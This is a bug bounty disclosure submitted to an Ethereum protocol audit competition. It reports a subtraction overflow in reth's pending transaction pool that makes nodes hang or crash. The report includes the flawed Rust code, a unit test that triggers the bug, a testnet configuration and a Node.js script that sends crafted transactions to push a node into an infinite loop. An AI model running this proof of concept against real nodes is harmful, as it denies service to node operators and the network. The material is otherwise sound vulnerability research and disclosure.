# #38502 \[BC-Low] Pending pool subtraction overflow causes node halt/shutdown

**Submitted on Jan 5th 2025 at 04:36:41 UTC by @Blobism for** [**Attackathon | Ethereum Protocol**](https://immunefi.com/audit-competition/ethereum-protocol-attackathon)

* **Report ID:** #38502
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/paradigmxyz/reth>
* **Impacts:**
  * Causing less than 25% of network processing nodes to process transactions from the mempool beyond set parameters (e.g. prevents processing transactions from the mempool)
  * Shutdown of less than 10% of network processing nodes without brute force actions, but does not shut down the network

## Description

## Brief/Intro

The latest `reth` release (`v1.1.4`) contains a subtraction overflow vulnerability in the pending transaction pool which can lead to node halt/shutdown, given the right set of transactions in the pool. A crafted set of transaction inputs can lead to an infinite loop in the pending pool for release builds, as a result of this subtraction overflow. The node will continue to run but will be unable to process transactions further.

## Vulnerability Details

The vulnerability is found in `crates/transaction-pool/src/pool/pending.rs`, in the function `remove_to_limit`. The actual line where the subtraction overflow can occur is: `non_local_senders -= unique_removed`.

Consider the case where this function receives the argument `remove_locals=False`. The logic is flawed in how `non_local_senders` is decremented, when one of the inner loops encounters a local transaction ( `non_local_senders -= 1`).

The desired behavior should be that when a local sender is encountered, the `non_local_senders` variable is decremented only ONCE for this particular sender. This allows the function to return when `non_local_senders == 0`.

The current behavior is that a single local sender can cause this `non_local_senders` variable to be decremented multiple times over the course of multiple iterations of the outer loop. This leads to incorrect tracking of the `non_local_senders`.

Now consider a case where a local sender has been double-counted due to this flawed counting. This can lead to a case where 2 external senders have all of their transactions removed during one outer loop iteration, but `non_local_senders=1` at the end of the outer loop, so the loop does not exit (assuming the pool still exceeds limits). At the start of the next iteration, we end up with `non_local_senders -=2` because `unique_removed=2`, overflowing `non_local_senders`.

If the local transactions are enough to exceed the limits of the pending pool, we are now stuck in an infinite outer loop for a release build, because the exit conditions of the loop will never be met. Transaction processing will thus halt.

If this is a debug build, the subtraction overflow will result in a panic, shutting down the node.

The relevant code is shown below, modified with comments to illustrate how the overflow occurs:

```rust
pub fn remove_to_limit(
    &mut self,
    limit: &SubPoolLimit,
    remove_locals: bool,
    end_removed: &mut Vec<Arc<ValidPoolTransaction<T::Transaction>>>,
) {
    let mut non_local_senders = self.highest_nonces.len();
    let mut unique_senders = self.highest_nonces.len();

    // ... (init vars)

    loop {
        // check how many unique senders were removed last iteration
        let unique_removed = unique_senders - self.highest_nonces.len();

        // the new number of unique senders
        unique_senders = self.highest_nonces.len();
        non_local_senders -= unique_removed; // <-------------- where the overflow occurs

        // ... (init more removal tracking)

        // loop through the highest nonces set, removing transactions until we reach the limit
        for tx in worst_transactions {
            // return early if the pool is under limits
            if !limit.is_exceeded(original_length - total_removed, original_size - total_size) ||
                non_local_senders == 0
            {
                // ...

                return
            }

            if !remove_locals && tx.transaction.is_local() {
                non_local_senders -= 1; // <-------------- flawed tracking logic
                continue
            }

            // ... (add to removal list)
        }

        // ... (remove the txs)

        // return if either the pool is under limits or there are no more _eligible_
        // transactions to remove
        if !self.exceeds(limit) || non_local_senders == 0 {
            return
        }
    }
}
```

## Impact Details

This exploit has the ability to silently halt production `reth` nodes via a crafted input of transactions. The conditions could certainly be met by accident as well to halt a node. The exploit appears to require the presence of local transactions. The percentage of `reth` execution nodes is 2% according to `clientdiversity.org`. Therefore, this vulnerability falls best under the scope of **preventing less than 25% of processing nodes from processing transactions from the mempool**.

This may also fall under the scope of **shutdown of less than 10% of network processing nodes without brute force actions**, given that debug build nodes can be crashed by the subtraction overflow.

This vulnerability has the potential to lead to **increasing less than 25% of network processing node resource consumption by at least 30% without brute force actions**. This concern comes from the fact that `remove_to_limit` is responsible for keeping pool memory consumption under set limits, but the tracking logic of the function is flawed. I have not found an exact approach to trigger undesired memory growth with this bug.

## References

<https://github.com/paradigmxyz/reth/blob/v1.1.4/crates/transaction-pool/src/pool/pending.rs>

## Link to Proof of Concept

<https://gist.github.com/knagaitsev/c4e91f828f2e32c33987dc481cafbf73>

## Proof of Concept

## Proof of Concept

The simplest example of how the infinite loop can be induced in production `reth` nodes is when the following senders and transactions are in the pending pool:

3 senders (1 local, 2 external):\
sender A (local) - enough transactions to exceed pool limits on their own\
sender B (external) - 2 transactions\
sender C (external) - 2 transactions

`non_local_senders=3` at the start. The above transaction set will lead to the following `non_local_senders` decrements within the loop:

**Iteration 0**

```
non_local_senders -= 0 // (unique_removed) - this happens no matter what
non_local_senders -= 1 // (local tx)
```

**Iteration 1**

```
non_local_senders -= 0 // (unique_removed) - all senders still have transactions
non_local_senders -= 1 // (local tx)
```

**Iteration 2**

```
non_local_senders -= 2 // (unique_removed) - 2 external senders no longer have transactions (overflow)
```

Now we enter an infinite outer loop since the `limit.is_exceeded(...)` remains true due to too many local transactions and `non_local_senders` never reaches zero due to the overflow.

### Unit test PoC

Adding the following unit test in `crates/transaction-pool/src/pool/pending.rs` can demonstrate the overflow:

```rust
#[test]
fn subtraction_overflow() {
    let mut f = MockTransactionFactory::default();
    let mut pool = PendingPool::new(MockOrdering::default());

    // Addresses for simulated senders A, B, C
    let a = address!("000000000000000000000000000000000000000a");
    let b = address!("000000000000000000000000000000000000000b");
    let c = address!("000000000000000000000000000000000000000c");

    // sender A (local) - 11+ transactions (large enough to keep limit exceeded)
    // sender B (external) - 2 transactions
    // sender C (external) - 2 transactions

    // Create transaction chains for senders A, B, C
    let a_txs = MockTransactionSet::sequential_transactions_by_sender(a, 11, TxType::Eip1559);
    let b_txs = MockTransactionSet::sequential_transactions_by_sender(b, 2, TxType::Eip1559);
    let c_txs = MockTransactionSet::sequential_transactions_by_sender(c, 2, TxType::Eip1559);

    // create local txs for sender A
    for tx in a_txs.into_vec() {
        let final_tx = Arc::new(f.validated_with_origin(crate::TransactionOrigin::Local, tx));

        pool.add_transaction(final_tx, 0);
    }

    // create external txs for senders B and C
    let remaining_txs = [b_txs.into_vec(), c_txs.into_vec()].concat();
    for tx in remaining_txs {
        let final_tx = f.validated_arc(tx);

        pool.add_transaction(final_tx, 0);
    }

    // Sanity check, ensuring everything is consistent.
    pool.assert_invariants();

    let pool_limit = SubPoolLimit { max_txs: 10, max_size: usize::MAX };

    // This will result in subtraction overflow panic for a debug build
    // or an infinite loop for a release build
    pool.truncate_pool(pool_limit);
}
```

You can run it as a debug build to see the overflow:

```bash
cargo test --package reth-transaction-pool --lib -- pool::pending::tests::subtraction_overflow --exact --show-output
```

Or a release build to see the infinite loop:

```bash
cargo test --package reth-transaction-pool --lib --release -- pool::pending::tests::subtraction_overflow --exact --show-output
```

### Private testnet PoC

To further confirm that this exploit could actually occur, a test with a private Kurtosis testnet is provided below.

Use the following `network_params.yaml`:

```yaml
participants:
  - el_type: reth
    el_image: ghcr.io/paradigmxyz/reth
    cl_type: lighthouse
    cl_image: sigp/lighthouse:latest
    el_extra_params: ["--txpool.pending-max-count", "10"]
  - el_type: reth
    el_image: ghcr.io/paradigmxyz/reth
    cl_type: teku
    cl_image: consensys/teku:latest
port_publisher:
  el:
    enabled: true
    public_port_start: 32000
```

Note that we have substantially reduced the pending max count to make the demonstration more clear. Attacks with a larger/default configuration can still be accomplished, and I can supplement with such a PoC if needed.

Run with:

```bash
kurtosis run github.com/ethpandaops/ethereum-package --args-file ./network_params.yaml --enclave my-testnet
```

Now run the following script with NodeJS (Be sure to do `npm init` and `npm install web3` beforehand):

```javascript
const { Web3 } = require('web3');

const localWeb3 = new Web3('http://127.0.0.1:32002');
const externalWeb3 = new Web3('http://127.0.0.1:32007');

const wallets = [
  // local sender
  {
    "address": "0x8943545177806ED17B9F23F0a21ee5948eCaa776",
    "private_key": "bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31"
  },
  // external senders
  {
    "address": "0xE25583099BA105D9ec0A67f5Ae86D90e50036425",
    "private_key": "39725efee3fb28614de3bacaffe4cc4bd8c436257e2c8bb887c4b5c4be45e76d"
  },
  {
    "address": "0x614561D2d143621E126e87831AEF287678B442b8",
    "private_key": "53321db7c1e331d93a11a41d16f004d7ff63972ec8ec7c25db329728ceeb1710"
  },
  // receiver
  {
    "address": "0xf93Ee4Cf8c6c40b329b0c0626F28333c132CF241",
    "private_key": "ab63b23eb7941c1251757e24b3d2350d2bc05c3c388d06f8fe6feafefb1e8c70"
  },
];

const sleep = (ms) => {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const createTx = async (from, to, nonceOffset=0, local=true) => {
  const web3 = local ? localWeb3 : externalWeb3;

  const tx = {
    from: from.address,
    to: to.address,
    value: web3.utils.toWei('100', 'ether'),
    gas: 21000,
    gasPrice: web3.utils.toWei('100', 'gwei'),
    nonce: from.txCount + BigInt(nonceOffset),
  };

  const signedTx = await web3.eth.accounts.signTransaction(tx, from["private_key"]);

  return signedTx;
}

const sendTx = (tx, local=true) => {
  const web3 = local ? localWeb3 : externalWeb3;
  return web3.eth.sendSignedTransaction(tx.rawTransaction);
}

const sendTxGetHash = (tx, local=true) => {
  const web3 = local ? localWeb3 : externalWeb3;
  return new Promise(resolve => {
    web3.eth.sendSignedTransaction(tx.rawTransaction).on('transactionHash', (hash) => {
      console.debug(`tx hash: ${hash}`);
      resolve(hash);
    });
  });
}

(async () => {
  for (let i = 0; i < wallets.length; i++) {
    const txCount = await localWeb3.eth.getTransactionCount(wallets[i].address);
    wallets[i].txCount = txCount;
    console.log(`addr: ${wallets[i].address}, txCount: ${txCount}`);
  }

  // create external txs with nonce=1
  const tx0 = await createTx(wallets[1], wallets[3], 1, false);
  const tx1 = await createTx(wallets[2], wallets[3], 1, false);

  // create external txs with nonce=0
  const tx2 = await createTx(wallets[1], wallets[3], 0, false);
  const tx3 = await createTx(wallets[2], wallets[3], 0, false);

  // create local tx with nonce=0
  const localTx0 = await createTx(wallets[0], wallets[3], 0, true);

  // create local txs with nonce=1-10 (inclusive)
  const targetLen = 10;
  const localTxs = [];
  for (let i = 0; i < targetLen; i++) {
    const nonceOffset = i + 1;
    const localTx = await createTx(wallets[0], wallets[3], nonceOffset, true);
    localTxs.push(localTx);
  }

  // send external txs (2 from each external sender)
  console.log("Sending external txs...");

  sendTx(tx0, false);
  sendTx(tx1, false);

  await sleep(1000);

  sendTx(tx2, false);
  sendTx(tx3, false);

  await sleep(1000);

  // send local txs, skipping nonce 0 so we can flush
  // from the queued pool to the pending pool with a single tx
  console.log("\nSending local txs...");

  for (let i = 0; i < targetLen; i++) {
    await sendTxGetHash(localTxs[i], true);
  }

  await sleep(1000);

  // send local tx with nonce 0
  sendTx(localTx0, true);

  // this print may not be reached
  console.log("\nExploit complete, pending pool should soon be stuck in infinite loop\n");
})();
```

There are some timing assumptions involved in this script, but if it works successfully, it should force the first release `reth` node into the pending pool infinite loop condition.
